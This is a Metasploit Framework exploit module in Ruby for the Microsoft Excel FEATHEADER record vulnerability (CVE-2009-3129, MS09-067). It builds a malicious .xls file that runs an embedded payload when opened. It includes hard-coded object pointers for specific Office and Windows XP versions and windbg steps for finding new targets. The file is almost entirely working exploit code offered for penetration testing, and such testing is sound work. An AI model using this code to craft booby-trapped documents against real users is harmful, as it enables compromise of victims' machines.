##
# $Id: ms09_067_excel_featheader.rb 10477 2010-09-25 11:59:02Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex/ole'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Excel Malformed FEATHEADER Record Vulnerability',
			'Description'    => %q{
						This module exploits a vulnerability in the handling of the FEATHEADER record
					by Microsoft Excel. Revisions of Office XP and later prior to the release of the
					MS09-067 bulletin are vulnerable.

					When processing a FEATHEADER (Shared Feature) record, Microsoft used a data
					structure from the file to calculate a pointer offset without doing proper
					validation. Attacker supplied data is then used to calculate the location of an
					object, and in turn a virtual function call. This results in arbitrary code
					exection.

					NOTE: On some versions of Office, the user will need to dismiss a warning dialog
					prior to the payload executing.
				},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Sean Larsson',  # original discovery
					'jduck'
				],
			'Version'        => '$Revision: 10477 $',
			'References'     =>
				[
					[ 'CVE','2009-3129' ],
					[ 'OSVDB', '59860' ],
					[ 'MSB', 'MS09-067' ],
					[ 'BID', '36945' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-09-083/' ],
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=832' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
					'DisableNops'   => true # no need
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					#
					# To find new targets, generate the file using the debug target and execute
					# the following in windbg:
					#
					# 0:000> s -b 0 L?-1 04 00 00 00 ee ff c0 da
					#
					# Use the largest number + 9 (should be in the 0x30xxxxxx range)
					#

					# Office v10.6501.6626, excel.exe v10.0.6501.0
					[ 'Microsoft Office 2002 (XP) SP3 base English on Windows XP SP3 English',
						{ 'ObjPtr' => 0x307ddd10 }
					],

					# Office v10.6854.6845, excel.exe v10.0.6854.0
					[ 'Microsoft Office 2002 (XP) SP3 w/kb969680 English on Windows XP SP3 English',
						{ 'ObjPtr' => 0x308082d0 }
					],

					# Office v11.5612.5606, excel.exe v11.0.5612.0
					[ 'Microsoft Office 2003 SP0 English on Windows XP SP3 English',
						{ 'ObjPtr' => 0x3085d430 }
					],

					# Office v12.0.6425.1000, excel.exe v12.0.6425.1000
					[ 'Microsoft Office 2007 SP2 English on Windows XP SP3 English',
						{ 'ObjPtr' => 0x30f69018 }
					],

					# crash on a deref path to heaven.
					[ 'Crash Target for Debugging',
						{ 'ObjPtr' => 0xdac0ffee }
					]
				],
			'DisclosureDate' => 'Nov 10 2009'))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.xls']),
			], self.class)
	end

	def add_record(tag, data=nil)
		ret = ""
		ret << Rex::OLE::Util.pack16(tag)
		data ||= ''
		ret << Rex::OLE::Util.pack16(data.length)
		ret << data
		ret
	end

	def exploit

		# build the Workbook stream
		ptr1 = target['ObjPtr']
		ptr2 = ptr1 + 4
		ptr3 = ptr2 + 4
		ptr4 = ptr3 + 4

		bofdata = ""
		bofdata << Rex::OLE::Util.pack16(0x0600)
		bofdata << Rex::OLE::Util.pack16(0x0005)
		bofdata << Rex::OLE::Util.pack16(0x1faa)
		bofdata << Rex::OLE::Util.pack16(0x07cd)
		bofdata << Rex::OLE::Util.pack32(0x000100c1)
		bofdata << Rex::OLE::Util.pack32(0x00000406)

		feathdr = ""
		feathdr << Rex::OLE::Util.pack16(0x0867) # frt
		feathdr << "\x00" * (10)
		feathdr << Rex::OLE::Util.pack16(0x0004) # isf
		feathdr << "\x01" # reserved
		feathdr << Rex::OLE::Util.pack32(0x00000004) # cbHdrData
		feathdr << [ptr1].pack('V')
		feathdr << rand_text_alphanumeric(1) # alignment
		feathdr << [ptr2].pack('V')
		feathdr << [ptr3 - 0x28].pack('V')
		feathdr << [ptr4].pack('V')
		#feathdr << "\xcc"
		feathdr << payload.encoded

		content = ""
		content << add_record(0x0809, bofdata)
		content << add_record(0x0867, feathdr)
		content << add_record(0x000a)

		print_status("Creating Excel spreadsheet ...")

		out = File.expand_path(File.join(datastore['OUTPUTPATH'], datastore['FILENAME']))
		stg = Rex::OLE::Storage.new(out, Rex::OLE::STGM_WRITE)
		if (not stg)
			raise RuntimeError, 'Unable to create output file'
		end
		stm = stg.create_stream("Workbook")
		if (not stm)
			raise RuntimeError, 'Unable to create workbook stream'
		end
		stm << content
		stm.close
		stg.close

		print_status("Generated output file #{out}")

	end

end
